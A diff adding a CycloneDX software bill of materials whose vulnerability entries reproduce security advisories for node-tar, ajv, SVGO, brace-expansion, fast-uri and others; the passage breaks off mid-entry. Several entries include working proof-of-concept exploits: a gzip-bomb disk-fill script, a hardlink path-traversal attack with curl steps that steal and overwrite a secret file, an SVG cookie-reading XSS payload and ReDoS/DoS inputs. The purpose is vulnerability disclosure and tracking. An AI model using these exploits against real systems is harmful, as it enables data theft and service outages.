@@ -1,0 +1,1982 @@
+{
+  "$schema": "http://cyclonedx.org/schema/bom-1.5.schema.json",
+  "bomFormat": "CycloneDX",
+  "specVersion": "1.5",
+  "version": 1,
+  "components": [
+    {
+      "bom-ref": "pkg:composer/guzzlehttp/guzzle@7.12.1",
+      "type": "library",
+      "name": "guzzlehttp/guzzle",
+      "version": "7.12.1",
+      "licenses": [],
+      "purl": "pkg:composer/guzzlehttp/guzzle@7.12.1"
+    },
+    {
+      "bom-ref": "pkg:composer/guzzlehttp/psr7@2.12.1",
+      "type": "library",
+      "name": "guzzlehttp/psr7",
+      "version": "2.12.1",
+      "licenses": [],
+      "purl": "pkg:composer/guzzlehttp/psr7@2.12.1"
+    },
+    {
+      "bom-ref": "pkg:npm/%40babel%2Fcore@7.26.10",
+      "type": "library",
+      "name": "@babel/core",
+      "version": "7.26.10",
+      "licenses": [],
+      "purl": "pkg:npm/%40babel%2Fcore@7.26.10"
+    },
+    {
+      "bom-ref": "pkg:npm/ajv@8.17.1",
+      "type": "library",
+      "name": "ajv",
+      "version": "8.17.1",
+      "licenses": [],
+      "purl": "pkg:npm/ajv@8.17.1"
+    },
+    {
+      "bom-ref": "pkg:npm/brace-expansion@1.1.11",
+      "type": "library",
+      "name": "brace-expansion",
+      "version": "1.1.11",
+      "licenses": [],
+      "purl": "pkg:npm/brace-expansion@1.1.11"
+    },
+    {
+      "bom-ref": "pkg:npm/brace-expansion@2.0.2",
+      "type": "library",
+      "name": "brace-expansion",
+      "version": "2.0.2",
+      "licenses": [],
+      "purl": "pkg:npm/brace-expansion@2.0.2"
+    },
+    {
+      "bom-ref": "pkg:npm/decompress@4.2.1",
+      "type": "library",
+      "name": "decompress",
+      "version": "4.2.1",
+      "licenses": [],
+      "purl": "pkg:npm/decompress@4.2.1"
+    },
+    {
+      "bom-ref": "pkg:npm/dompurify@3.4.11",
+      "type": "library",
+      "name": "dompurify",
+      "version": "3.4.11",
+      "licenses": [],
+      "purl": "pkg:npm/dompurify@3.4.11"
+    },
+    {
+      "bom-ref": "pkg:npm/fast-uri@3.1.2",
+      "type": "library",
+      "name": "fast-uri",
+      "version": "3.1.2",
+      "licenses": [],
+      "purl": "pkg:npm/fast-uri@3.1.2"
+    },
+    {
+      "bom-ref": "pkg:npm/got@7.1.0",
+      "type": "library",
+      "name": "got",
+      "version": "7.1.0",
+      "licenses": [],
+      "purl": "pkg:npm/got@7.1.0"
+    },
+    {
+      "bom-ref": "pkg:npm/immutable@5.1.5",
+      "type": "library",
+      "name": "immutable",
+      "version": "5.1.5",
+      "licenses": [],
+      "purl": "pkg:npm/immutable@5.1.5"
+    },
+    {
+      "bom-ref": "pkg:npm/js-yaml@3.14.2",
+      "type": "library",
+      "name": "js-yaml",
+      "version": "3.14.2",
+      "licenses": [],
+      "purl": "pkg:npm/js-yaml@3.14.2"
+    },
+    {
+      "bom-ref": "pkg:npm/js-yaml@4.1.1",
+      "type": "library",
+      "name": "js-yaml",
+      "version": "4.1.1",
+      "licenses": [],
+      "purl": "pkg:npm/js-yaml@4.1.1"
+    },
+    {
+      "bom-ref": "pkg:npm/jszip@3.2.2",
+      "type": "library",
+      "name": "jszip",
+      "version": "3.2.2",
+      "licenses": [],
+      "purl": "pkg:npm/jszip@3.2.2"
+    },
+    {
+      "bom-ref": "pkg:npm/svgo@4.0.1",
+      "type": "library",
+      "name": "svgo",
+      "version": "4.0.1",
+      "licenses": [],
+      "purl": "pkg:npm/svgo@4.0.1"
+    },
+    {
+      "bom-ref": "pkg:npm/tar@2.2.2",
+      "type": "library",
+      "name": "tar",
+      "version": "2.2.2",
+      "licenses": [],
+      "purl": "pkg:npm/tar@2.2.2"
+    },
+    {
+      "bom-ref": "pkg:npm/validate.js@0.13.1",
+      "type": "library",
+      "name": "validate.js",
+      "version": "0.13.1",
+      "licenses": [],
+      "purl": "pkg:npm/validate.js@0.13.1"
+    },
+    {
+      "bom-ref": "pkg:npm/ws@8.20.1",
+      "type": "library",
+      "name": "ws",
+      "version": "8.20.1",
+      "licenses": [],
+      "purl": "pkg:npm/ws@8.20.1"
+    },
+    {
+      "bom-ref": "pkg:pypi/idna@3.9.0",
+      "type": "library",
+      "name": "idna",
+      "version": "3.9.0",
+      "licenses": [],
+      "purl": "pkg:pypi/idna@3.9.0"
+    },
+    {
+      "bom-ref": "pkg:pypi/requests@2.9.2",
+      "type": "library",
+      "name": "requests",
+      "version": "2.9.2",
+      "licenses": [],
+      "purl": "pkg:pypi/requests@2.9.2"
+    },
+    {
+      "bom-ref": "pkg:pypi/tqdm@4.9.0",
+      "type": "library",
+      "name": "tqdm",
+      "version": "4.9.0",
+      "licenses": [],
+      "purl": "pkg:pypi/tqdm@4.9.0"
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "id": "GHSA-23hp-3jrh-7fpw",
+      "references": [
+        {
+          "id": "CVE-2026-59873",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+        }
+      ],
+      "description": "node-tar: Decompression/parse DoS via unlimited input",
+      "detail": "### Summary\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.\n\n1. Create the exploit script:\n```javascript\nconst fs = require('fs'), z = require('zlib'), t = require('tar');\n\nconst d = 'dos_test';\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\nfs.mkdirSync(d);\n\n// Build 10GB header\nconst h = Buffer.alloc(512);\nh.write('payload');\nh.write((10*1024**3).toString(8).padStart(11,'0'), 124); \nh.write('ustar', 257);\nlet s = 256;\nfor(let i=0;i\u003c512;i++) if(i\u003c148||i\u003e155) s+=h[i];\nh.write(s.toString(8).padStart(6,'0'), 148);\n\nconst gz = z.createGzip();\ngz.pipe(t.x({cwd: d}));\ngz.write(h);\n\nconst b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\n\nconst run = () =\u003e {\n  while (gz.write(b));\n  gz.once('drain', run);\n};\n\nconst monitor = setInterval(() =\u003e {\n    try {\n        const bytes = fs.statSync(`${d}/payload`).size;\n        const mb = Math.floor(bytes / (1024 * 1024));\n        process.stdout.write(`\\r[\u003e] Extracted: ${mb} MB`);\n        \n        if (mb \u003e 5000) { \n            console.log('\\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); \n            process.exit(); \n        }\n    } catch {}\n}, 50);\n\nprocess.on('exit', () =\u003e {\n    clearInterval(monitor);\n    console.log('[*] Cleaning up...');\n    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\n});\n\nrun();\n```\n\n2. Run the PoC:\n```bash\nnode poc.js\n```\n\n**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being \"sent\" through the gzip stream is negligible.\n\n### Impact\nThis is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59873"
+        }
+      ],
+      "published": "2026-07-20T21:52:03Z",
+      "updated": "2026-07-21T14:59:37Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-2g4f-4pwh-qvx6",
+      "references": [
+        {
+          "id": "CVE-2025-69873",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "description": "ajv has ReDoS when using `$data` option",
+      "detail": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69873"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+        }
+      ],
+      "published": "2026-02-11T21:30:39Z",
+      "updated": "2026-03-04T15:06:32Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/ajv"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-2p49-hgcm-8545",
+      "references": [],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+        }
+      ],
+      "description": "SVGO removeScripts plugin leaves some executable scripts intact",
+      "detail": "### Summary\n\nSVGO's removeScripts plugin (disabled by default) removes scripts from the SVG, however executable scripts were left intact in some cases. If a consumer relied on this plugin for sanitization and served them to users, these SVGs could open up doors to XSS.\n\n### Details\n\nSVGO has a plugin for removing scripts from an SVG, which removes:\n\n- `\u003cscript\u003e` elements\n- JavaScript URIs (v4 and v3 only)\n- `on…` event handlers (v4 and v3 only)\n\nWhile SVGO is not a sanitization library, SVGO continues to maintain the plugin for those already using it for this purpose.\n\nHowever, there were two problems:\n\n- SVGO did not check namespaced/prefixed `script` elements, for example if one declared an explicit prefix for the SVG namespace ( `\u003csvg:script\u003e`) instead of using the default namespace ( `\u003cscript\u003e`), the `\u003csvg:script\u003e` tag would be left intact.\n- SVGO case sensitively matched JavaScript URIs, but it should've been case-insensitive.\n\n#### Proof of Concept\n\n```js\nimport { optimize } from 'svgo';\n\n/** Presume that this string was obtained in some other way, such as network. */\nconst original = `\n  \u003csvg xmlns=\"http://www.w3.org/2000/svg\" xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns:uwu=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 100 100\" version=\"1.1\"\u003e\n    \u003ca uwu:href=\"JavaScript:(() =\u0026gt; { alert(document.cookie) })();\"\u003e\u003ctext y=\"30\"\u003euwu\u003c/text\u003e\u003c/a\u003e\n    \u003csvg:script\u003e\n      alert(document.cookie);\n    \u003c/svg:script\u003e\n  \u003c/svg\u003e\n`;\n\noptimize(original, {\n  plugins: ['removeScripts']\n});\n// Did not remove \u003csvg:script\u003e or uwu:href=\"JavaScript:…—still executed by browsers.\n```\n\n### Impact\n\nIf you run SVGO on untrusted input (e.g., user uploads to a web application) and you depended on removeScripts, then some scripts may still be present. If that SVG was then opened directly by another user on the same domain, it could invoke scripts that could read local storage or cookies.\n\nThis may affect you if you have enabled one of the following:\n\n| SVGO Version | Plugin Name |\n|---|---|\n| v4 | removeScripts |\n| v3 | removeScriptElement |\n| v2 | removeScriptElement |\n| v1 | removeScriptElement |\n\nIt's unlikely to impact users who just use SVGO locally on their own SVGs or in build pipelines.\n\n### Patches\n\n#### \u003e= 3.0.0, \u003c= 4.0.1\n\nSVGO patched v4.0.2 and v3.3.4. Just upgrade the dependency using your preferred package manager! For example:\n\n```sh\nyarn up svgo\n\n# or if SVGO is a nested dependency\nyarn up -R svgo\n```\n\nThe proposed fix is to improve our namespace-aware handling to explicitly act on the default namespace, SVG namespace, and XHTML namespace only. This handles all scripts that are executed by browsers, but will leave intact custom prefixes that happen to have an element called `\u003c*:script\u003e` which clients shouldn't treat as executable. \n\n#### \u003e= 2.0.0, \u003c= 2.8.2\n\nSVGO patched v2.8.3, however SVGO v2 explicitly only implements and documents that it will remove `\u003cscript\u003e` elements and nothing more. It has the namespace aware handling for tags like `\u003csvg:script\u003e` or `\u003cxhtml:script\u003e`, but has **_not_** been updated to remove JavaScript URIs or event handlers like \u003e= v3. If this is something you need, please upgrade to v4 or v3, or reach for one of the documented workarounds at the end.\n\n#### \u003e= 1.0.0, \u003c= 1.3.2\n\nSVGO v1 has been deprecated for a while now and won't be patched. Please upgrade to a more recent version! If something is preventing you from doing so, please reach out! We're happy to expand our migration guides or support you if you're having trouble.\n\n### Workarounds\n\nIf your motivation for enabling the plugin is SVG sanitization, consider reaching for a dedicated SVG sanitization tool and invoke it before passing the SVG to SVGO.",
+      "advisories": [],
+      "published": "2026-07-21T19:42:04Z",
+      "updated": "2026-07-21T19:45:24Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/svgo"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-34x7-hfp2-rc4v",
+      "references": [
+        {
+          "id": "CVE-2026-24842",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+        }
+      ],
+      "description": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+      "detail": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) =\u003e {\n  if (req.method === 'POST' \u0026\u0026 req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c =\u003e chunks.push(c));\n    req.on('end', async () =\u003e {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' \u0026\u0026 req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' \u0026\u0026 req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c =\u003e chunks.push(c));\n    req.on('end', () =\u003e {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () =\u003e console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i \u003c 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" \u003e secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration \u0026 Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24842"
+        }
+      ],
+      "published": "2026-01-28T16:35:31Z",
+      "updated": "2026-02-04T03:15:55Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-36fh-84j7-cv5h",
+      "references": [
+        {
+          "id": "CVE-2022-48285",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "JSZip contains Path Traversal via loadAsync",
+      "detail": "loadAsync in JSZip before 3.8.0 allows Directory Traversal via a crafted ZIP archive.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-48285"
+        }
+      ],
+      "published": "2023-01-29T06:30:52Z",
+      "updated": "2024-11-18T16:26:28Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/jszip"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3jfq-g458-7qm9",
+      "references": [
+        {
+          "id": "CVE-2021-32804",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
+        }
+      ],
+      "description": "Arbitrary File Creation/Overwrite due to insufficient absolute path sanitization",
+      "detail": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to prevent extraction of absolute file paths by turning absolute paths into relative paths when the `preservePaths` flag is not set to `true`. This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`. \n\nThis logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths. When given an absolute file path with repeating path roots, the resulting path (e.g. `///home/user/.bashrc`) would still resolve to an absolute path, thus allowing arbitrary file creation and overwrite. \n\n### Patches\n\n3.2.2 || 4.4.14 || 5.0.6 || 6.1.1\n\nNOTE: an adjacent issue [CVE-2021-32803](https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw) affects this release level. Please ensure you update to the latest patch levels that address CVE-2021-32803 as well if this adjacent issue affects your `node-tar` use case.\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom `onentry` method which sanitizes the `entry.path` or a `filter` method which removes entries with absolute paths.\n\n```js\nconst path = require('path')\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  // either add this function...\n  onentry: (entry) =\u003e {\n    if (path.isAbsolute(entry.path)) {\n      entry.path = sanitizeAbsolutePathSomehow(entry.path)\n      entry.absolute = path.resolve(entry.path)\n    }\n  },\n\n  // or this one\n  filter: (file, entry) =\u003e {\n    if (path.isAbsolute(entry.path)) {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32804"
+        }
+      ],
+      "published": "2021-08-03T19:06:36Z",
+      "updated": "2026-07-08T06:28:51Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3jxr-9vmj-r5cp",
+      "references": [
+        {
+          "id": "CVE-2026-13149",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/S:N/AU:Y/R:U/V:D/RE:M/U:Amber"
+        }
+      ],
+      "description": "brace-expansion: DoS via exponential-time expansion of consecutive non-expanding {} groups",
+      "detail": "### Summary\nbrace-expansion's expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node's single-threaded event loop, one small input can fully stall a worker/process.\n\nIn `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don't use it:\n```js\nconst post = m.post.length ? expand_(m.post, max, false) : [''];   // always recurses\n  ...\nif (!isSequence \u0026\u0026 !isOptions) {\n  if (m.post.match(/,(?!,).*\\}/)) {\n    str = m.pre + '{' + m.body + escClose + m.post;\n    return expand_(str, max, true); // restart — `post` discarded\n  }\n  return [str];\n}\n```\n\nFor input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.\nEach level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.\n\nThe max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.\n  \nMeasured on 5.0.6:\n\n| groups (n) | input bytes | time |\n|---|---|---|\n| 20 | 60 | 130 ms |\n| 24 | 72 | 1.9 s |\n| 26 | 78 | 7.8 s |\n| 30 (PoC) | 90 | ~2 min |\n\n### Proof of concept\n```js\nconst { expand } = require('brace-expansion');\n// 30 non-expanding groups, ~90 bytes — blocks for minutes:\nexpand('a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}');\n```\n\n### Impact\n\nAny application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.\n\n### Remediation\n\nUpgrade to a patched release. The fix:\n1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.\n1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.\n\nVerified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.\n\nIf immediate upgrade isn't possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-13149"
+        }
+      ],
+      "published": "2026-07-20T20:51:09Z",
+      "updated": "2026-07-21T14:59:37Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/brace-expansion"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-4c8g-83qw-93j6",
+      "references": [
+        {
+          "id": "CVE-2026-13676",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "description": "fast-uri vulnerable to host confusion via failed IDN canonicalization",
+      "detail": "### Impact\n\n`fast-uri` versions `\u003e= 2.3.1, \u003c= 4.0.0` fail to canonicalize Unicode/IDN hostnames for HTTP-family URLs. The IDN conversion path calls `URL.domainToASCII(...)` on the global WHATWG `URL` constructor, where that helper does not exist. The resulting `TypeError` is silently routed into `parsed.error`, but `parse()`, `normalize()`, and `equal()` all return with the host left in its original Unicode form.\n\nFor example, `http://127。0。0。1/` is treated by `fast-uri` as host `127。0。0。1`, while Node's WHATWG URL parser and `fetch()` canonicalize the same input to `127.0.0.1`.\n\nApplications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) before passing the same URL into Node's URL or `fetch()` consumers see a policy/use desync and can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` v4.0.1, v3.1.3, or v2.4.2\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-13676"
+        }
+      ],
+      "published": "2026-07-21T19:03:11Z",
+      "updated": "2026-07-21T19:15:31Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/fast-uri"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-4x5r-pxfx-6jf8",
+      "references": [
+        {
+          "id": "CVE-2026-49356",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N"
+        }
+      ],
+      "description": "@babel/core: Arbitrary File Read via sourceMappingURL Comment",
